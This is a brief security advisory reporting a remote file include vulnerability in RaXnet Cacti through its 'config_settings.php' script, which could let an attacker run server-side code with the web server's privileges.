RaXnet Cacti is prone to a remote file include vulnerability.

The problem presents itself specifically when an attacker passes the location of a remote attacker-specified script through the 'config_settings.php' script.

An attacker may leverage this issue to execute arbitrary server-side script code on an affected computer with the privileges of the Web server process. This may facilitate unauthorized access.
